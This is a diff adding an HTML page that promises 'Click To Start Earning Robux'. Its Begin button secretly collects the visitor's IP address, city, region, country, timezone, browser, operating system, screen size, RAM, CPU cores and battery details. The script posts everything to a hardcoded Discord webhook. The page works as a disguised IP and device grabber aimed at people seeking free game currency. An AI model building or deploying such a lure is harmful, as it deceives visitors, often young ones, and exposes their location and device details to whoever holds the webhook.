@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RobuxAds</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            border-radius: 10px;
+            background-color: #fff;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 350px;
+        }
+        h1 {
+            font-size: 24px;
+        }
+        .button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Click To Start Earning Robux</h1>
+        <button class="button" onclick="sendInfo()">Begin</button>
+    </div>
+
+    <script>
+        function sendInfo() {
+            fetch('https://ipwhois.app/json/')
+                .then(response => response.json())
+                .then(data => {
+                    // Collecting additional info
+                    const geoInfo = `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nTimezone: ${data.timezone}\nCurrency: ${data.currency}`;
+
+                    const systemInfo = `
+                        Screen Resolution: ${window.innerWidth}x${window.innerHeight}
+                        Browser: ${navigator.userAgent}
+                        Operating System: ${navigator.platform}
+                        Device Type: ${getDeviceType()}
+                        Language: ${navigator.language}
+                        Battery Status: ${navigator.getBattery ? getBatteryStatus() : 'N/A'}
+                        RAM: ${navigator.deviceMemory}GB
+                        CPU Cores: ${navigator.hardwareConcurrency}
+                    `;
+
+                    const performanceInfo = `Page Load Time: ${window.performance.timing.loadEventEnd - window.performance.timing.navigationStart} ms`;
+
+                    // Send the info to Discord Webhook
+                    sendToWebhook(geoInfo, systemInfo, performanceInfo);
+                })
+                .catch(error => {
+                    console.error('Error fetching geo data:', error);
+                });
+        }
+
+        function getDeviceType() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            if (userAgent.includes('mobile')) return 'Mobile';
+            if (userAgent.includes('tablet')) return 'Tablet';
+            return 'Desktop';
+        }
+
+        function getBatteryStatus() {
+            navigator.getBattery().then(function(battery) {
+                return `Level: ${battery.level * 100}% Charging: ${battery.charging ? 'Yes' : 'No'}`;
+            });
+        }
+
+        function sendToWebhook(geoInfo, systemInfo, performanceInfo) {
+            const webhookURL = "https://discord.com/api/webhooks/1334960796609937499/7YlpdDT2pphEH6wCeuD6eS10QIS1QQVyz2HicjXZPK5lZ7XOpgs3ZBiG_7fDFhiTpAWm"; // Replace with your actual Discord webhook URL
+
+            const content = {
+                content: "Detailed System Information",
+                embeds: [{
+                    title: "System Information",
+                    fields: [
+                        { name: "Geolocation Info", value: geoInfo, inline: false },
+                        { name: "System Info", value: systemInfo, inline: false },
+                        { name: "Performance Info", value: performanceInfo, inline: false }
+                    ],
+                    footer: {
+                        text: "Info Sent from Web"
+                    }
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(content)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Data sent to Discord:', data))
+            .catch(error => console.error('Error sending data to Discord:', error));
+        }
+    </script>
+</body>
+</html>
